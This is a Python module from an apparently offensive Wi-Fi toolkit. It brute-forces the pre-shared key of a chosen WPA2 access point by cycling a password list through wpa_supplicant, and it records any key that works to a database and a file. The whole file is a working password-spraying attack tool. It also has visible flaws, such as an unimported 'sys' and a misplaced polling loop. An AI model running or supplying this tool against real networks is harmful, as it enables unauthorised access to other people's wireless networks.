# Module: wpabrute.py
# Description: Performs a Spray Brute-force attack against the Wi-Fi Protected Access (WPA) protocol.
# The WPAbrute module is tailored to spray a list of passwords against a single access point/SSID.
# Author: Nick Sanzotta/@Beamr
# Version: v 1.05162017

import os, threading, time
# WPA Supplicant required libs
from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
from twisted.internet import task
# Theme
from theme import *


# Database
from dbcommands import DB
# Database connection
# CHECK: needs to be relocated, used while testing database.py
import sqlite3
try:
     # Connect to Database 
     # ISSUE/TEMP hardcoded db_path
     conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
     conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
     conn.isolation_level = None # KEEP Autocommit Mode
     db = DB(conn)
except Exception as e:
     print(red('!') + 'Could not connect to database: ' +str(e))
     sys.exit(1)

class wpaBrute(threading.Thread):
	def __init__(self, ssid, password, supplicantInt, interface):
			threading.Thread.__init__(self)
			self.setDaemon(1) # Creates Thread in daemon mode
			self.ssid = ssid
			self.password = password
			self.supplicantInt = supplicantInt
			self.interface = interface

	def run(self):
		# Time Stamp for file creation
		timestr = time.strftime("%Y%m%d-%H%M") # NOT SURE I NEED THIS ANY LONGER
		# Time Stamp for entire credential spray
		curr_time1 = time.time()
		# Container of successfully authenticated psk
		successList = []
		# Kill Switch to stop on success
		stop = False
		# Checks password Queue
		while not self.password.empty():
			cls()
			banner()
			for password in self.password.get():
				if stop:
					break
				else:
					# Time Stamp for each user
					curr_time2 = time.time()
					#DEBUG PRINT
					network_cfg = {
							"disabled": 0,
							"ssid": self.ssid, 
							"mode": 0,
							"proto": "WPA2",
							"key_mgmt": "WPA-PSK",
							"pairwise": "CCMP",
							"psk": password,	

						}		

					# Conf Added # Adds a new network to the interface
					self.interface.add_network(network_cfg)
					# Attempt association with a configured network # Connect to Network Profile 0
					self.interface.select_network(self.supplicantInt+'/Networks/0')	
					# DEBUG: Print Current WPA CONF
					# print(interface.get_current_network())	

				while True:
					if self.interface.get_state() == 'completed':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing PSK        : ' + ' ' + password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Success: '+ colors.green + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs\n' % (time.time() - curr_time2))
						pskSuccess = password
						successList.append(pskSuccess)
						db.wpabrute_commit(self.ssid, password)
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Sets Kill Switch to true
						stop = True
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'disconnected':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing PSK        : ' + ' ' + password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Failed: '+ colors.red + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs\n ' % (time.time() - curr_time2))
						# Remove from associated network, which results in state: 'inactive'
						try:
							self.interface.remove_network(self.supplicantInt+'/Networks/0')
						except Exception as e:
							print(' [!] Error: ' + str(e))
							print(' [i] Attempting to recover.\n')
							time.sleep(1.5) # Testing might be able to lower this value
							pass
						# Wait for inactive state, based on a timer.
						time.sleep(7) # May be able to lower this value for WPA?
					elif self.interface.get_state() == 'inactive':
						break

			cls()
			banner()
			print(' PSK Discovered: ')
			try:
				for _ in successList:
					print(' ' + _)
					with open('data/'+self.ssid+'_'+timestr+'.txt', 'a+') as f1:
						f1.write(_+'\n')
			except UnboundLocalError:
				#ISSUE NOT PRINTING.
				print(colors.red + 'None: [!]' + colors.normal)	
	
			print("\n Completed Time in: %.1fs\n" % (time.time() - curr_time1))
			self.password.task_done()